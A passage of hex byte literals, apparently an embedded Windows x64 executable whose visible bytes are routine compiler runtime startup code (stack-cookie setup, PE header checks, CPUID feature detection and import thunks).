0x03, 0x00, 0x00, 0x8B, 0xC3, 0xEB, 0x19, 0x8B, 0xD8, 0xE8, 0x9B, 0x06, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x3B, 0x80, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x05, 0xE8, 0xF3, 0x09, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0x1B, 0x05, 0x00, 0x00, 0x90, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0x10, 0x05, 0x00, 0x00, 0x8B, 0xCB, 0xE8, 0xA1, 0x09, 0x00, 0x00, 0x90, 0x8B, 0xCB, 0xE8, 0x9F, 0x09, 0x00, 0x00, 0x90, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xD7, 0x03, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xE9, 0x72, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x33, 0xC9, 0xFF, 0x15, 0x7B, 0x0C, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x6A, 0x0C, 0x00, 0x00, 0xFF, 0x15, 0x74, 0x0C, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xBA, 0x09, 0x04, 0x00, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x48, 0xFF, 0x25, 0xA8, 0x0C, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0xB9, 0x17, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x8C, 0x0C, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x07, 0xB9, 0x02, 0x00, 0x00, 0x00, 0xCD, 0x29, 0x48, 0x8D, 0x0D, 0xF2, 0x1C, 0x00, 0x00, 0xE8, 0xA9, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x05, 0xD9, 0x1D, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x89, 0x05, 0x69, 0x1D, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xC2, 0x1D, 0x00, 0x00, 0x48, 0x89, 0x05, 0x33, 0x1C, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x89, 0x05, 0x37, 0x1D, 0x00, 0x00, 0xC7, 0x05, 0x0D, 0x1C, 0x00, 0x00, 0x09, 0x04, 0x00, 0xC0, 0xC7, 0x05, 0x07, 0x1C, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xC7, 0x05, 0x11, 0x1C, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8D, 0x0D, 0x09, 0x1C, 0x00, 0x00, 0x48, 0xC7, 0x04, 0x01, 0x02, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x0D, 0x99, 0x1B, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x04, 0x20, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x01, 0x48, 0x8B, 0x0D, 0x7C, 0x1B, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x04, 0x20, 0x48, 0x8D, 0x0D, 0xA0, 0x0D, 0x00, 0x00, 0xE8, 0xFF, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0x40, 0x53, 0x56, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0xA3, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0xB3, 0xF8, 0x00, 0x00, 0x00, 0x33, 0xFF, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x54, 0x24, 0x60, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x41, 0x0B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x39, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x68, 0x48, 0x8B, 0x54, 0x24, 0x60, 0x4C, 0x8B, 0xC8, 0x48, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8B, 0xC6, 0x48, 0x8D, 0x4C, 0x24, 0x70, 0x48, 0x89, 0x4C, 0x24, 0x28, 0x33, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xFF, 0x15, 0x12, 0x0B, 0x00, 0x00, 0xFF, 0xC7, 0x83, 0xFF, 0x02, 0x7C, 0xB1, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x9F, 0x07, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x21, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x08, 0xEB, 0x05, 0x48, 0x3B, 0xC8, 0x74, 0x14, 0x33, 0xC0, 0xF0, 0x48, 0x0F, 0xB1, 0x0D, 0x7C, 0x20, 0x00, 0x00, 0x75, 0xEE, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB0, 0x01, 0xEB, 0xF7, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x0F, 0xB6, 0x05, 0x67, 0x20, 0x00, 0x00, 0x85, 0xC9, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x44, 0xC3, 0x88, 0x05, 0x57, 0x20, 0x00, 0x00, 0xE8, 0x9E, 0x05, 0x00, 0x00, 0xE8, 0xBD, 0x02, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x04, 0x32, 0xC0, 0xEB, 0x14, 0xE8, 0xB0, 0x02, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x09, 0x33, 0xC9, 0xE8, 0xA5, 0x02, 0x00, 0x00, 0xEB, 0xEA, 0x8A, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x80, 0x3D, 0x1C, 0x20, 0x00, 0x00, 0x00, 0x8B, 0xD9, 0x75, 0x67, 0x83, 0xF9, 0x01, 0x77, 0x6A, 0xE8, 0x05, 0x07, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x28, 0x85, 0xDB, 0x75, 0x24, 0x48, 0x8D, 0x0D, 0x06, 0x20, 0x00, 0x00, 0xE8, 0x93, 0x07, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x10, 0x48, 0x8D, 0x0D, 0x0E, 0x20, 0x00, 0x00, 0xE8, 0x83, 0x07, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x2E, 0x32, 0xC0, 0xEB, 0x33, 0x66, 0x0F, 0x6F, 0x05, 0x59, 0x0C, 0x00, 0x00, 0x48, 0x83, 0xC8, 0xFF, 0xF3, 0x0F, 0x7F, 0x05, 0xD5, 0x1F, 0x00, 0x00, 0x48, 0x89, 0x05, 0xDE, 0x1F, 0x00, 0x00, 0xF3, 0x0F, 0x7F, 0x05, 0xDE, 0x1F, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE7, 0x1F, 0x00, 0x00, 0xC6, 0x05, 0xB1, 0x1F, 0x00, 0x00, 0x01, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xB9, 0x05, 0x00, 0x00, 0x00, 0xE8, 0x5E, 0x02, 0x00, 0x00, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x18, 0x4C, 0x8B, 0xC1, 0xB8, 0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39, 0x05, 0xC9, 0xE9, 0xFF, 0xFF, 0x75, 0x78, 0x48, 0x63, 0x0D, 0xFC, 0xE9, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xB9, 0xE9, 0xFF, 0xFF, 0x48, 0x03, 0xCA, 0x81, 0x39, 0x50, 0x45, 0x00, 0x00, 0x75, 0x5F, 0xB8, 0x0B, 0x02, 0x00, 0x00, 0x66, 0x39, 0x41, 0x18, 0x75, 0x54, 0x4C, 0x2B, 0xC2, 0x0F, 0xB7, 0x51, 0x14, 0x48, 0x83, 0xC2, 0x18, 0x48, 0x03, 0xD1, 0x0F, 0xB7, 0x41, 0x06, 0x48, 0x8D, 0x0C, 0x80, 0x4C, 0x8D, 0x0C, 0xCA, 0x48, 0x89, 0x14, 0x24, 0x49, 0x3B, 0xD1, 0x74, 0x18, 0x8B, 0x4A, 0x0C, 0x4C, 0x3B, 0xC1, 0x72, 0x0A, 0x8B, 0x42, 0x08, 0x03, 0xC1, 0x4C, 0x3B, 0xC0, 0x72, 0x08, 0x48, 0x83, 0xC2, 0x28, 0xEB, 0xDF, 0x33, 0xD2, 0x48, 0x85, 0xD2, 0x75, 0x04, 0x32, 0xC0, 0xEB, 0x14, 0x83, 0x7A, 0x24, 0x00, 0x7D, 0x04, 0x32, 0xC0, 0xEB, 0x0A, 0xB0, 0x01, 0xEB, 0x06, 0x32, 0xC0, 0xEB, 0x02, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x8A, 0xD9, 0xE8, 0xEF, 0x05, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x74, 0x0B, 0x84, 0xDB, 0x75, 0x07, 0x48, 0x87, 0x15, 0xDE, 0x1E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x80, 0x3D, 0xD3, 0x1E, 0x00, 0x00, 0x00, 0x8A, 0xD9, 0x74, 0x04, 0x84, 0xD2, 0x75, 0x0C, 0xE8, 0x36, 0x01, 0x00, 0x00, 0x8A, 0xCB, 0xE8, 0x2F, 0x01, 0x00, 0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0x3D, 0xAE, 0x1E, 0x00, 0x00, 0xFF, 0x48, 0x8B, 0xD9, 0x75, 0x07, 0xE8, 0x42, 0x06, 0x00, 0x00, 0xEB, 0x0F, 0x48, 0x8B, 0xD3, 0x48, 0x8D, 0x0D, 0x98, 0x1E, 0x00, 0x00, 0xE8, 0x2B, 0x06, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x48, 0x0F, 0x44, 0xD3, 0x48, 0x8B, 0xC2, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xBB, 0xFF, 0xFF, 0xFF, 0x48, 0xF7, 0xD8, 0x1B, 0xC0, 0xF7, 0xD8, 0xFF, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0x05, 0x94, 0x18, 0x00, 0x00, 0x48, 0xBB, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x48, 0x3B, 0xC3, 0x75, 0x74, 0x48, 0x83, 0x65, 0x10, 0x00, 0x48, 0x8D, 0x4D, 0x10, 0xFF, 0x15, 0xB6, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x89, 0x45, 0xF0, 0xFF, 0x15, 0x60, 0x08, 0x00, 0x00, 0x8B, 0xC0, 0x48, 0x31, 0x45, 0xF0, 0xFF, 0x15, 0xAC, 0x08, 0x00, 0x00, 0x8B, 0xC0, 0x48, 0x8D, 0x4D, 0x18, 0x48, 0x31, 0x45, 0xF0, 0xFF, 0x15, 0xA4, 0x08, 0x00, 0x00, 0x8B, 0x45, 0x18, 0x48, 0x8D, 0x4D, 0xF0, 0x48, 0xC1, 0xE0, 0x20, 0x48, 0x33, 0x45, 0x18, 0x48, 0x33, 0x45, 0xF0, 0x48, 0x33, 0xC1, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x23, 0xC1, 0x48, 0xB9, 0x33, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x48, 0x3B, 0xC3, 0x48, 0x0F, 0x44, 0xC1, 0x48, 0x89, 0x05, 0x11, 0x18, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0xF7, 0xD0, 0x48, 0x89, 0x05, 0xFA, 0x17, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xB8, 0x00, 0x40, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0x48, 0x8D, 0x0D, 0xD9, 0x1D, 0x00, 0x00, 0x48, 0xFF, 0x25, 0x12, 0x08, 0x00, 0x00, 0xCC, 0xCC, 0xB0, 0x01, 0xC3, 0xCC, 0xC2, 0x00, 0x00, 0xCC, 0x48, 0x8D, 0x05, 0xD1, 0x1D, 0x00, 0x00, 0xC3, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xB7, 0xF7, 0xFF, 0xFF, 0x48, 0x83, 0x08, 0x24, 0xE8, 0xE6, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0x08, 0x02, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0x33, 0xC0, 0x39, 0x05, 0xB0, 0x17, 0x00, 0x00, 0x0F, 0x94, 0xC0, 0xC3, 0x48, 0x8D, 0x05, 0xC1, 0x1D, 0x00, 0x00, 0xC3, 0x48, 0x8D, 0x05, 0xB1, 0x1D, 0x00, 0x00, 0xC3, 0x83, 0x25, 0x99, 0x1D, 0x00, 0x00, 0x00, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x48, 0x8D, 0xAC, 0x24, 0x40, 0xFB, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xC0, 0x05, 0x00, 0x00, 0x8B, 0xD9, 0xB9, 0x17, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xC6, 0x07, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x04, 0x8B, 0xCB, 0xCD, 0x29, 0xB9, 0x03, 0x00, 0x00, 0x00, 0xE8, 0xC4, 0xFF, 0xFF, 0xFF, 0x33, 0xD2, 0x48, 0x8D, 0x4D, 0xF0, 0x41, 0xB8, 0xD0, 0x04, 0x00, 0x00, 0xE8, 0x1D, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xF0, 0xFF, 0x15, 0x81, 0x07, 0x00, 0x00, 0x48, 0x8B, 0x9D, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0xD8, 0x04, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x45, 0x33, 0xC0, 0xFF, 0x15, 0x1F, 0x07, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x3C, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x48, 0x8D, 0x8D, 0xE0, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x95, 0xD8, 0x04, 0x00, 0x00, 0x4C, 0x8B, 0xC8, 0x48, 0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, 0x8D, 0xE8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x28, 0x48, 0x8D, 0x4D, 0xF0, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x33, 0xC9, 0xFF, 0x15, 0xE6, 0x06, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xC8, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x85, 0xE8, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8D, 0x85, 0xC8, 0x04, 0x00, 0x00, 0x41, 0xB8, 0x98, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x89, 0x85, 0x88, 0x00, 0x00, 0x00, 0xE8, 0x86, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xC8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0xC7, 0x44, 0x24, 0x50, 0x15, 0x00, 0x00, 0x40, 0xC7, 0x44, 0x24, 0x54, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xBA, 0x06, 0x00, 0x00, 0x83, 0xF8, 0x01, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x45, 0xF0, 0x0F, 0x94, 0xC3, 0x48, 0x89, 0x44, 0x24, 0x48, 0x33, 0xC9, 0xFF, 0x15, 0x81, 0x06, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xFF, 0x15, 0x6E, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x0C, 0x84, 0xDB, 0x75, 0x08, 0x8D, 0x48, 0x03, 0xE8, 0xBE, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0xD0, 0x05, 0x00, 0x00, 0x48, 0x81, 0xC4, 0xC0, 0x05, 0x00, 0x00, 0x5D, 0xC3, 0xCC, 0xE9, 0x3B, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xFF, 0x15, 0x50, 0x06, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x39, 0xB9, 0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39, 0x08, 0x75, 0x2F, 0x48, 0x63, 0x48, 0x3C, 0x48, 0x03, 0xC8, 0x81, 0x39, 0x50, 0x45, 0x00, 0x00, 0x75, 0x20, 0xB8, 0x0B, 0x02, 0x00, 0x00, 0x66, 0x39, 0x41, 0x18, 0x75, 0x15, 0x83, 0xB9, 0x84, 0x00, 0x00, 0x00, 0x0E, 0x76, 0x0C, 0x83, 0xB9, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x95, 0xC0, 0xEB, 0x02, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x0D, 0x09, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x25, 0xEA, 0x05, 0x00, 0x00, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x19, 0x48, 0x8B, 0xF9, 0x81, 0x3B, 0x63, 0x73, 0x6D, 0xE0, 0x75, 0x1C, 0x83, 0x7B, 0x18, 0x04, 0x75, 0x16, 0x8B, 0x53, 0x20, 0x8D, 0x82, 0xE0, 0xFA, 0x6C, 0xE6, 0x83, 0xF8, 0x02, 0x76, 0x15, 0x81, 0xFA, 0x00, 0x40, 0x99, 0x01, 0x74, 0x0D, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xE8, 0x58, 0x02, 0x00, 0x00, 0x48, 0x89, 0x18, 0x48, 0x8B, 0x5F, 0x08, 0xE8, 0x52, 0x02, 0x00, 0x00, 0x48, 0x89, 0x18, 0xE8, 0xDA, 0x02, 0x00, 0x00, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x1D, 0x3B, 0x0D, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0x34, 0x0D, 0x00, 0x00, 0xEB, 0x12, 0x48, 0x8B, 0x03, 0x48, 0x85, 0xC0, 0x74, 0x06, 0xFF, 0x15, 0xF4, 0x06, 0x00, 0x00, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x3B, 0xDF, 0x72, 0xE9, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x1D, 0x0F, 0x0D, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0x08, 0x0D, 0x00, 0x00, 0xEB, 0x12, 0x48, 0x8B, 0x03, 0x48, 0x85, 0xC0, 0x74, 0x06, 0xFF, 0x15, 0xB8, 0x06, 0x00, 0x00, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x3B, 0xDF, 0x72, 0xE9, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x33, 0xC0, 0x33, 0xC9, 0x0F, 0xA2, 0x44, 0x8B, 0xC1, 0x45, 0x33, 0xDB, 0x44, 0x8B, 0xD2, 0x41, 0x81, 0xF0, 0x6E, 0x74, 0x65, 0x6C, 0x41, 0x81, 0xF2, 0x69, 0x6E, 0x65, 0x49, 0x44, 0x8B, 0xCB, 0x8B, 0xF0, 0x33, 0xC9, 0x41, 0x8D, 0x43, 0x01, 0x45, 0x0B, 0xD0, 0x0F, 0xA2, 0x41, 0x81, 0xF1, 0x47, 0x65, 0x6E, 0x75, 0x89, 0x04, 0x24, 0x45, 0x0B, 0xD1, 0x89, 0x5C, 0x24, 0x04, 0x8B, 0xF9, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54, 0x24, 0x0C, 0x75, 0x5B, 0x48, 0x83, 0x0D, 0xBB, 0x14, 0x00, 0x00, 0xFF, 0x25, 0xF0, 0x3F, 0xFF, 0x0F, 0x48, 0xC7, 0x05, 0xA3, 0x14, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x3D, 0xC0, 0x06, 0x01, 0x00, 0x74, 0x28, 0x3D, 0x60, 0x06, 0x02, 0x00, 0x74, 0x21, 0x3D, 0x70, 0x06, 0x02, 0x00, 0x74, 0x1A, 0x05, 0xB0, 0xF9, 0xFC, 0xFF, 0x83, 0xF8, 0x20, 0x77, 0x24, 0x48, 0xB9, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x0F, 0xA3, 0xC1, 0x73, 0x14, 0x44, 0x8B, 0x05, 0x69, 0x1A, 0x00, 0x00, 0x41, 0x83, 0xC8, 0x01, 0x44, 0x89, 0x05, 0x5E, 0x1A, 0x00, 0x00, 0xEB, 0x07, 0x44, 0x8B, 0x05, 0x55, 0x1A, 0x00, 0x00, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x48, 0xFB, 0x3B, 0xF0, 0x7C, 0x26, 0x33, 0xC9, 0x0F, 0xA2, 0x89, 0x04, 0x24, 0x44, 0x8B, 0xDB, 0x89, 0x5C, 0x24, 0x04, 0x89, 0x4C, 0x24, 0x08, 0x89, 0x54, 0x24, 0x0C, 0x0F, 0xBA, 0xE3, 0x09, 0x73, 0x0A, 0x45, 0x0B, 0xC1, 0x44, 0x89, 0x05, 0x22, 0x1A, 0x00, 0x00, 0xC7, 0x05, 0x14, 0x14, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x0D, 0x11, 0x14, 0x00, 0x00, 0x0F, 0xBA, 0xE7, 0x14, 0x0F, 0x83, 0x91, 0x00, 0x00, 0x00, 0x44, 0x89, 0x0D, 0xFC, 0x13, 0x00, 0x00, 0xBB, 0x06, 0x00, 0x00, 0x00, 0x89, 0x1D, 0xF5, 0x13, 0x00, 0x00, 0x0F, 0xBA, 0xE7, 0x1B, 0x73, 0x79, 0x0F, 0xBA, 0xE7, 0x1C, 0x73, 0x73, 0x33, 0xC9, 0x0F, 0x01, 0xD0, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B, 0xD0, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x22, 0xC3, 0x3A, 0xC3, 0x75, 0x57, 0x8B, 0x05, 0xC7, 0x13, 0x00, 0x00, 0x83, 0xC8, 0x08, 0xC7, 0x05, 0xB6, 0x13, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x89, 0x05, 0xB4, 0x13, 0x00, 0x00, 0x41, 0xF6, 0xC3, 0x20, 0x74, 0x38, 0x83, 0xC8, 0x20, 0xC7, 0x05, 0x9D, 0x13, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x89, 0x05, 0x9B, 0x13, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x03, 0xD0, 0x44, 0x23, 0xD8, 0x44, 0x3B, 0xD8, 0x75, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x24, 0xE0, 0x3C, 0xE0, 0x75, 0x0D, 0x83, 0x0D, 0x7C, 0x13, 0x00, 0x00, 0x40, 0x89, 0x1D, 0x72, 0x13, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x28, 0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x10, 0x5F, 0xC3, 0x33, 0xC0, 0x39, 0x05, 0x70, 0x13, 0x00, 0x00, 0x0F, 0x95, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x25, 0xBA, 0x03, 0x00, 0x00, 0xFF, 0x25, 0xAC, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x9E, 0x03, 0x00, 0x00, 0xFF, 0x25, 0xB0, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x02, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x04, 0x04, 0x00, 0x00, 0xFF, 0x25, 0xD6, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x60, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x52, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x44, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x36, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x28, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x1A, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x0C, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x66, 0x04, 0x00, 0x00, 0xFF, 0x25, 0xF0, 0x03, 0x00, 0x00, 0xFF, 0x25, 0xE2, 0x03, 0x00, 0x00, 0xFF, 0x25, 0xD4, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x9E, 0x03, 0x00, 0x00, 0xFF, 0x25, 0xE0, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x72, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x5C, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x2E, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x08, 0x04, 0x00, 0x00, 0xFF, 0x25, 0x9A, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x9C, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x76, 0x03, 0x00, 0x00, 0xFF, 0x25, 0x28, 0x03, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x25, 0xFA, 0x03, 0x00, 0x00, 0x40, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0x01, 0x48, 0x8B, 0xD1, 0x8B, 0x08, 0xE8, 0x1C, 0xFF, 0xFF, 0xFF, 0x90, 0x48, 0x83, 0xC4, 0x20, 0x5D, 0xC3, 0xCC, 0x40, 0x55, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0x01, 0x33, 0xC9, 0x81, 0x38, 0x05, 0x00, 0x00, 0xC0, 0x0F, 0x94, 0xC1, 0x8B, 0xC1, 0x5D, 0xC3, 0xCC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2A, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x2E, 